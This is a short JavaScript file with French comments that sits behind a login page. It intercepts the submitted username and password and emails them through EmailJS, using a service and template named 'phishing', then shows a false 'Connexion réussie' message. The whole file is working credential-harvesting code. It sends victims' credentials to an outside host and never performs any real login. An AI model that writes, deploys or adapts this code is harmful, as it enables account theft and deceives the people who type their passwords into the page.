document.addEventListener("DOMContentLoaded", function() {
    const loginForm = document.getElementById("loginForm");

    // Initialiser EmailJS avec votre clé publique
    emailjs.init('TR-V0PpRNpxABebux');

    loginForm.addEventListener("submit", function(event) {
        event.preventDefault();

        const username = document.getElementById("username").value;
        const password = document.getElementById("password").value;

        // Afficher le message "Connexion en cours..."
        const loginMessage = document.getElementById("loginMessage");
        loginMessage.textContent = "Connexion en cours...";

        // Envoyer l'email via EmailJS avec seulement le template ID
        emailjs.send("service_phishing", "template_phishing", {
            username: username,
            password: password
        }).then(function(response) {
            console.log("SUCCESS!", response.status, response.text);
            loginMessage.textContent = "Connexion réussie.";
        }, function(error) {
            console.log("FAILED...", error);
            loginMessage.textContent = "Erreur de connexion.";
        });
    });
});
